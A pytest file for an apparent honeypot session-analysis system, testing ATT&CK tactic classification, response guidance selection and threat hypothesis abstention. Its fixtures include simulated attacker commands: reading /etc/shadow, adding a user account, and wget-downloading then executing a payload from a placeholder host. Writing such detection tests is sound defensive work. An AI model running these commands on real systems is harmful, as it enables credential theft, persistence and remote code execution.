from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest

from production.policies.validate_response_guidance_policy import (
    validate_response_guidance_policy,
)
from production.policies.threat_hypothesis_behavior_policy import (
    validate_behavior_policy,
)
from production.reporting.response_guidance_v3 import (
    build_response_guidance_v3_from_session,
)
from production.reporting.session_assessment_v4 import (
    build_session_assessment_v4,
    validate_session_assessment_v4,
)
from production.reporting.threat_hypothesis import build_follow_on_hypothesis
from production.storage import open_storage
from production.workers.analysis_worker import deterministic_baseline_report


ROOT = Path(__file__).resolve().parents[1]
BEHAVIOR_POLICY = "configs/threat_hypothesis_behavior.trusted.json"
CLASSIFICATION_POLICY = "configs/classification_rules.trusted.json"
GUIDANCE_POLICY = ROOT / "configs" / "response_guidance_policy.v3.json"


def _session(command: str, *, tactic: str, ttp: str, session_id: str) -> dict:
    timestamp = "2026-07-29T13:00:00Z"
    return {
        "session_id": session_id,
        "src_ip": "192.0.2.90",
        "commands": [command],
        "commands_success": [command],
        "classification_events": [
            {
                "command": command,
                "original_command": command,
                "ttp": ttp,
                "tactic": tactic,
                "source": "rule",
                "high_confidence": True,
                "evidence_id": f"classification-{session_id}",
                "event_timestamp": timestamp,
                "cowrie_eventid": "cowrie.command.input",
            }
        ],
        "raw_events": [
            {
                "session": session_id,
                "src_ip": "192.0.2.90",
                "timestamp": timestamp,
                "eventid": "cowrie.command.input",
                "input": command,
                "success": 1,
            }
        ],
    }


@pytest.mark.parametrize(
    ("command", "tactic", "ttp"),
    [
        ("base64 --decode /var/tmp/captured.bin", "defense-evasion", "T1140"),
        ("crontab --list", "execution", "T1053"),
        ("systemctl status sshd", "persistence", "T1057"),
    ],
)
def test_broad_tactic_without_literal_operation_selects_no_specialized_guidance(
    command: str,
    tactic: str,
    ttp: str,
) -> None:
    guidance = build_response_guidance_v3_from_session(
        _session(
            command,
            tactic=tactic,
            ttp=ttp,
            session_id=f"phase9a-broad-{ttp.lower()}",
        )
    )

    assert [action["action_id"] for action in guidance["advisory_actions"]] == [
        "review-observed-source-in-real-auth-logs"
    ]
    assert all(
        "persistence" not in action["description"].lower()
        and "execution matching" not in action["description"].lower()
        for action in guidance["advisory_actions"]
    )


@pytest.mark.parametrize(
    ("command", "tactic", "ttp", "expected_action"),
    [
        (
            "python3 /var/tmp/maintenance.py",
            "execution",
            "T1059",
            "correlate-observed-execution-attempt",
        ),
        (
            "cat /etc/shadow",
            "credential-access",
            "T1552",
            "review-credential-exposure-and-reuse",
        ),
    ],
)
def test_literal_operation_still_selects_bounded_specialized_guidance(
    command: str,
    tactic: str,
    ttp: str,
    expected_action: str,
) -> None:
    guidance = build_response_guidance_v3_from_session(
        _session(
            command,
            tactic=tactic,
            ttp=ttp,
            session_id=f"phase9a-literal-{ttp.lower()}",
        )
    )

    assert expected_action in {
        action["action_id"] for action in guidance["advisory_actions"]
    }
    assert all(
        action["requires_manual_approval"] is True
        and action["safe_to_auto_execute"] is False
        for action in guidance["advisory_actions"]
    )


def test_guidance_policy_rejects_broad_tactic_as_sole_semantic_support() -> None:
    policy = json.loads(GUIDANCE_POLICY.read_text(encoding="utf-8"))
    forged = copy.deepcopy(policy)
    forged["action_playbooks"][0]["applies_when"] = {
        "any_tactics": ["execution"]
    }

    assert any(
        "broad ATT&CK tactics cannot be the sole semantic support" in error
        for error in validate_response_guidance_policy(forged)
    )


def test_read_only_schedule_inspection_does_not_claim_continued_access() -> None:
    session = _session(
        "crontab -l",
        tactic="execution",
        ttp="T1053",
        session_id="phase9a-readonly-schedule",
    )
    report = build_session_assessment_v4(
        [session],
        raw_events=session["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )

    assert "possible_continued_access_preparation" not in {
        finding["finding_type"] for finding in report["behavioral_findings"]
    }
    assert "correlate-observed-execution-attempt" not in {
        action["action_id"]
        for action in report["response_guidance_v3"]["advisory_actions"]
    }
    assert validate_session_assessment_v4(report) == []


def test_persistence_finding_requires_literal_mutation_evidence() -> None:
    session = _session(
        "useradd audithelper",
        tactic="persistence",
        ttp="T1136",
        session_id="phase9a-account-mutation",
    )
    report = build_session_assessment_v4(
        [session],
        raw_events=session["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )

    assert "possible_continued_access_preparation" in {
        finding["finding_type"] for finding in report["behavioral_findings"]
    }
    assert validate_session_assessment_v4(report) == []

    policy = json.loads(
        (ROOT / BEHAVIOR_POLICY).read_text(encoding="utf-8")
    )
    del policy["policy"]["claims"]["independent"]["persistence"][
        "literal_action_types"
    ]
    assert any(
        "persistence.literal_action_types" in error
        for error in validate_behavior_policy(policy)
    )


@pytest.mark.parametrize("artifact", ["agent.bin", "collector.sh"])
def test_unresolved_relative_transfer_identity_abstains_from_hypothesis(
    artifact: str,
) -> None:
    session_id = f"phase9a-unresolved-{artifact.replace('.', '-')}"
    commands = [
        (
            "cd /var/tmp && wget "
            f"https://example.invalid/{artifact} -O {artifact}"
        ),
        f"sh /var/tmp/{artifact}",
    ]
    events = [
        {
            "session": session_id,
            "src_ip": "192.0.2.91",
            "timestamp": f"2026-07-29T13:01:0{index}Z",
            "eventid": "cowrie.command.input",
            "input": command,
            "success": 1,
        }
        for index, command in enumerate(commands)
    ]
    report = build_session_assessment_v4(
        [
            {
                "session_id": session_id,
                "src_ip": "192.0.2.91",
                "commands": commands,
                "commands_success": commands,
                "classification_events": [],
                "raw_events": events,
            }
        ],
        raw_events=events,
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=CLASSIFICATION_POLICY,
    )

    assert report["hypothesis_sets"] == []
    assert validate_session_assessment_v4(report) == []


def test_matching_completion_elsewhere_in_session_suppresses_hypothesis() -> None:
    entity_id = "entity-resolved-artifact"
    transfer_ref = "command-action-transfer"
    execution_ref = "command-action-execution"
    observed = {
        "ordered_behavior_chain": [],
        "ordered_command_observations": [
            {
                "evidence_id": transfer_ref,
                "action_types": ["transfer_attempt"],
                "entities": {
                    "destination_paths": [
                        {
                            "entity_id": entity_id,
                            "uncertain": False,
                            "linkable": True,
                        }
                    ]
                },
            },
            {
                "evidence_id": execution_ref,
                "action_types": ["execution_attempt"],
                "entities": {
                    "executed_paths": [
                        {
                            "entity_id": entity_id,
                            "uncertain": False,
                            "linkable": True,
                        }
                    ]
                },
            },
        ],
        "connected_behavior_chains": [
            {
                "chain_id": "chain-resolved-transfer",
                "entity_refs": [entity_id],
                "evidence_refs": [transfer_ref],
                "action_types": ["transfer_attempt"],
                "ordered_actions": [
                    {
                        "evidence_id": transfer_ref,
                        "action_types": ["transfer_attempt"],
                        "entities": {
                            "destination_paths": [
                                {
                                    "entity_id": entity_id,
                                    "uncertain": False,
                                    "linkable": True,
                                }
                            ]
                        },
                    }
                ],
            }
        ],
    }

    result = build_follow_on_hypothesis(
        observed,
        behavior_policy_path=BEHAVIOR_POLICY,
    )

    assert result["abstained"] is True
    assert result["claims"] == []
    assert result["selection_semantics"] == (
        "contradicted_or_unresolved_incomplete_chain_abstention"
    )
    assert result["disconfirming_observations"][0]["evidence_refs"] == [
        execution_ref
    ]


def test_no_command_fallback_persists_canonical_session_identity(tmp_path) -> None:
    session_id = "phase9a-no-command"
    session = {
        "session_id": session_id,
        "src_ip": "192.0.2.92",
        "commands": [],
        "commands_success": [],
        "commands_failed": [],
        "raw_events": [],
        "is_ended": True,
    }
    report = deterministic_baseline_report(session, "controlled failure")
    assert report["session_id"] == session_id
    assert report["canonical_evidence"]["session_id"] == session_id

    storage = open_storage(f"sqlite:///{tmp_path / 'phase9a.db'}")
    storage.save_session(session)
    job_id = storage.enqueue_analysis_job(session)
    claim = storage.claim_analysis_jobs("phase9a-worker", 1, 30, 1)[0]
    report_without_convenience_id = copy.deepcopy(report)
    report_without_convenience_id.pop("session_id")
    report_id = storage.complete_analysis_job(
        job_id,
        "phase9a-worker",
        claim["claim_token"],
        report_without_convenience_id,
    )

    assert report_id
    persisted = storage.list_rows("reports", limit=1)[0]
    assert persisted["session_id"] == session_id
